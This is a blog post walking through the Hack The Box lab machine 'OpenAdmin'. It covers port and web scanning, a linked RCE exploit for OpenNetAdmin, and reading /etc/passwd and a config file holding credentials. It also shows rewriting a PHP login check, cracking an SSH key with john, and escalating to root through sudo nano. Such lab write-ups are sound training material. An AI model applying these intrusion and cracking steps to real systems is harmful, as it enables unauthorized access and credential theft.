<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>HTB - OpenAdmin |</title><meta name=Description content><meta property="og:title" content="HTB - OpenAdmin"><meta property="og:description" content="The importance to also patch your &ldquo;applications&rdquo;, and not just your services.
Recon Again, this is an HTB box, so recon is mainly active, and I feel like activ recon == enum.
Still, we can check :
 Name of the box : OpenAdmin ; OS &ldquo;type&rdquo;, : Linux : Hints given on HTB website, information section :   
Enum As always, we start with an nmap scan :"><meta property="og:type" content="article"><meta property="og:url" content="https://www.masoopy.com/htb-openadmin/"><meta property="article:published_time" content="2021-02-08T12:42:29+01:00"><meta property="article:modified_time" content="2021-02-08T12:42:29+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - OpenAdmin"><meta name=twitter:description content="The importance to also patch your &ldquo;applications&rdquo;, and not just your services.
Recon Again, this is an HTB box, so recon is mainly active, and I feel like activ recon == enum.
Still, we can check :
 Name of the box : OpenAdmin ; OS &ldquo;type&rdquo;, : Linux : Hints given on HTB website, information section :   
Enum As always, we start with an nmap scan :"><meta name=application-name content="Masoopy"><meta name=apple-mobile-web-app-title content="Masoopy"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.masoopy.com/htb-openadmin/><link rel=prev href=https://www.masoopy.com/htb-blue/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB - OpenAdmin","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.masoopy.com\/htb-openadmin\/"},"genre":"posts","keywords":"HTB","wordCount":899,"url":"https:\/\/www.masoopy.com\/htb-openadmin\/","datePublished":"2021-02-08T12:42:29+01:00","dateModified":"2021-02-08T12:42:29+01:00","publisher":{"@type":"Organization","name":"Author"},"author":{"@type":"Person","name":"Author"},"description":""}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.masoopy.com\/"},{"@type":"ListItem","position":2,"name":"hacking","item":"https://www.masoopy.com/categories/hacking/"},{"@type":"ListItem","position":3,"name":"HTB - OpenAdmin"}]}</script></head><body data-header-desktop data-header-mobile><script>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':(''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy class=header-logo>Masoopy</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/cheatsheets/>Cheatsheets </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=https://twitter.com/nesousx rel="noopener noreffer" target=_blank><i class="fab fa-twitter"></i>React on Twitter! </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy class=header-logo>Masoopy</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/>Posts</a><a class=menu-item href=/cheatsheets/>Cheatsheets</a><a class=menu-item href=/tags/>Tags</a><a class=menu-item href=/categories/>Categories</a><a class=menu-item href=https://twitter.com/nesousx rel="noopener noreffer" target=_blank><i class="fab fa-twitter"></i>React on Twitter!</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><main class=main><div class="container content-article theme-classic"><div class=toc id=toc-auto><div class=toc-title>Contents</div><div class=toc-content id=toc-content-auto></div></div><div class=header-post><div class=post-title><div class=post-all-meta><div class=breadcrumbs><a href=/>Home </a>/ <a href=/categories/hacking/>hacking </a>/ <a href=/>HTB - OpenAdmin</a></div><h1 class="single-title animated flipInX">HTB - OpenAdmin</h1><div class=post-meta><div class=post-meta-line><span class=post-category><a href=/categories/hacking/><i class="far fa-folder fa-fw"></i>&nbsp;hacking</a>&nbsp;<a href=/categories/write-ups/><i class="far fa-folder fa-fw"></i>&nbsp;write-ups</a>
</span>&nbsp;&nbsp;&nbsp;&nbsp;<i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time class=timeago datetime=2021-02-08>2021-02-08</time>&nbsp;&nbsp;&nbsp;&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;899 words
&nbsp;&nbsp;&nbsp;&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes</div></div></div></div></div><article class="single toc-start"><div class="content-block content-block-first content-block-position"><div class=post><div class=image-theme-classic><img src=/images/2021/02/OpenAdmin.png style=width:100%></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#enum>Enum</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#privesc>PrivEsc</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><p>The importance to also patch your &ldquo;applications&rdquo;, and not just your services.</p><h2 id=recon>Recon</h2><p>Again, this is an HTB box, so recon is mainly active, and I feel like activ recon == enum.</p><p>Still, we can check :</p><ul><li>Name of the box : OpenAdmin ;</li><li>OS &ldquo;type&rdquo;, : Linux :</li><li>Hints given on HTB website, information section :</li></ul><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/2021-02-08_12-13.png data-srcset="/images/2021/02/2021-02-08_12-13.png, /images/2021/02/2021-02-08_12-13.png 1.5x, /images/2021/02/2021-02-08_12-13.png 1.6x" data-sizes=auto alt=/images/2021/02/2021-02-08_12-13.png title=2021-02-08_12-13.png></div></p><h2 id=enum>Enum</h2><p>As always, we start with an nmap scan :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>sudo nmap -T4 -A -p- $target_ip
</code></pre></div><div class=highlight><pre class=chroma><code class=language-text data-lang=text># Nmap 7.91 scan initiated Thu Jan 28 15:27:52 2021 as: nmap -T4 -A -p- -oA HTB/OpenAdmin/nmap $target_ip
Nmap scan report for $target_ip
Host is up (0.023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/28%OT=22%CT=1%CU=33687%PV=Y%DS=2%DC=T%G=Y%TM=6012CA1
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%II=I%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T5(R=N)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   22.95 ms 10.10.14.1
2   24.65 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 28 15:28:39 2021 -- 1 IP address (1 host up) scanned in 47.14 seconds

</code></pre></div><p>We find 2 services : ssh and Apache, both on standard ports. I like to check <code>searchsploit</code> for every service + version I find, in order to see if there any big vulnerability. In general, SSH isn&rsquo;t something that I"ll try to attack right away. It is more of a &ldquo;last chance&rdquo; path, with brute force.</p><p>In our case, we found a web server running Apache, but th version doesn&rsquo;t seem vulnerable. So, let&rsquo;s fire <code>nikto</code> and <code>dirbuster</code> :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>nikto -h http://$target_ip
</code></pre></div><p>And dirbuster like so :</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/2021-02-08_11-28.png data-srcset="/images/2021/02/2021-02-08_11-28.png, /images/2021/02/2021-02-08_11-28.png 1.5x, /images/2021/02/2021-02-08_11-28.png 1.6x" data-sizes=auto alt=/images/2021/02/2021-02-08_11-28.png title=2021-02-08_11-28.png></div></p><p>Dirbuster, will find an interesting dir &ldquo;ona&rdquo;, browsing to this ressource we discorverd it is running OpenNetAdmni version 18.1.1 which is outdated and probably vulnerable&mldr;</p><p><div style=text-align:center><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/ONA.png data-srcset="/images/2021/02/ONA.png, /images/2021/02/ONA.png 1.5x, /images/2021/02/ONA.png 1.6x" data-sizes=auto alt=/images/2021/02/ONA.png title=ONA.png></div></p><p>Indeed, after a quick search, we discover that it is vulnerable to Remote Code Execution (RCE), one of the most dangerous vuln we could find. Awesome!</p><h2 id=exploitation>Exploitation</h2><p>The vuln in question can be found here : <a href=https://www.exploit-db.com/exploits/47691 target=_blank rel="noopener noreffer">https://www.exploit-db.com/exploits/47691</a> it is a simple Python script that will grant you a shell access on the remote machine.</p><p>Unfortunately, this shell only runs as <code>www-data</code>, the default <code>Apache</code> user and with <code>/sbin/nologin</code> shell. Still, we can still look around. I usually check what files I have access to :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>find / -xdev -type f -user $current_user
</code></pre></div><p>Let&rsquo;s check who was access to sudo :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>ls -lhtrR /etc/sudo*
</code></pre></div><p>I also like to check what users are on the system and see if I can acces some files inside their home&rsquo;s folders :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>cat /etc/passwd &amp;&amp; ls -lhtrR /home/
</code></pre></div><p>And of course in our case, explore the webroot folders.</p><p>Doing so, we discover two users : <code>joanna</code> and <code>jimmy</code> and an interesting set of credentials inside <code>/var/www/html/local/ona/config</code>.</p><p>It happens that the password from this file is actually jimmy&rsquo;s account SSH password. We now have a real bash shell, in a real terminal, with bash completion, hurray!</p><p>Once again, we check for common stuff, like what files do we own, and sudo rights :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>sudo -l
</code></pre></div><p>So, no sudo rights for us, however, we discover a new website that only runs on localhost. This website is very important, as we can see that, once logged as Jimmy, it will send us the SSH private key of Joanna.</p><p>I decided to create an SSH tunnel :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>ssh -L 52846:127.0.0.1:52846 -N -f jimmy@$target_ip
</code></pre></div><p>And to modify the login page in order to get rid of authentication :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>&lt;?php
            $msg = &#39;&#39;;

            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
              if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) {
                  $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;;
                  header(&#34;Location: /main.php&#34;);
              } else {
                  $msg = &#39;Wrong username or password.&#39;;
              }
            }
         ?&gt;
</code></pre></div><p>becomes :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>          &lt;?php
            $msg = &#39;&#39;;

            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
              if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; $_POST[&#39;password&#39;] == &#39;plop&#39;) {
            //  if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) {
                  $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;;
                  header(&#34;Location: /main.php&#34;);
              } else {
                  $msg = &#39;Wrong username or password.&#39;;
              }
            }
         ?&gt;
</code></pre></div><p>We can now browse to 127.0.0.1:52846 and log in with <code>jimmy</code> // <code>plop</code>.</p><p>And bingo! We got Joanna&rsquo;s key with an extra tip :</p><blockquote><p>Don&rsquo;t forget your &ldquo;ninja&rdquo; password</p></blockquote><p>Of course, Joanna-s key is encrypted&mldr; We save it as id_joanna and hash it :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>python /usr/share/john/ssh2john.py id_joanna &gt; joanna.hash
</code></pre></div><p>Now that we have the hashed version, time to crask it :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>john -wordlist=/usr/share/wordlists/rockyou.txt joanna.hash 
</code></pre></div><p>We finally, have joanna&rsquo;s ssh key password, we can now connect to the server as her!</p><h3 id=privesc>PrivEsc</h3><p>As usual, we do all our basic checks. Doing so, we will notice :</p><ul><li>We have access to user.txt flag ;</li><li>We have access to <code>sudo /bin/nano /opt/priv</code> without password.</li></ul><p>Accessing root password which is always located in <code>/root/root.txt</code> is a simple matter of running <code>nano</code> as root (with <code>sudo</code>) and entering command mode with <code>^R</code> + <code>^X</code> to <code>cat</code> the flag file).</p><p>We now got <code>root.txt</code>!</p><h2 id=conclusion>Conclusion</h2><p>As we have just seen, one can obtain root access to a machine via &ldquo;third party&rdquo; application while the rest of the system is up to date. So, make sure to keep everything updated!</p></div><div class=post><div class=post-info-share><span></span></div><div class=post-footer id=post-footer><div class=post-navigation><div class="post-nav-box nav-box-prev"><a class=nav-box href=/htb-blue/><span class=nav-icon><svg aria-hidden="true" data-prefix="fas" data-icon="chevron-circle-left" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 504C119 504 8 393 8 256S119 8 256 8s248 111 248 248-111 248-248 248zM142.1 273l135.5 135.5c9.4 9.4 24.6 9.4 33.9.0l17-17c9.4-9.4 9.4-24.6.0-33.9L226.9 256l101.6-101.6c9.4-9.4 9.4-24.6.0-33.9l-17-17c-9.4-9.4-24.6-9.4-33.9.0L142.1 239c-9.4 9.4-9.4 24.6.0 34z"/></svg></span><div style=text-align:right;padding-left:10px><div class=nav-text-h>Next article</div><span class=nav-text>HTB - Blue</span></div></a></div></div></div></div></div><div id=toc-final></div></article><div class="post-tags post-tags-toc"><a href=/tags/htb/ class=tag>HTB</a></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.79.1">Hugo</a> | Theme - <a href="https://ublogger.netlify.app/?utm_source=https://www.masoopy.com/&utm_medium=footer&utm_campaign=config&utm_term=1.2.0" target=_blank title="uBlogger 1.2.0"><i class="fas fa-pencil-alt fa-fw"></i>uBlogger</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span>2021</span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script src=/lib/smooth-scroll/smooth-scroll.min.js></script><script src=/lib/lazysizes/lazysizes.min.js></script><script src=/lib/clipboard/clipboard.min.js></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10}};</script><script src=/js/theme.min.js></script><script src=/js/jquery-3.5.1.min.js></script></body></html>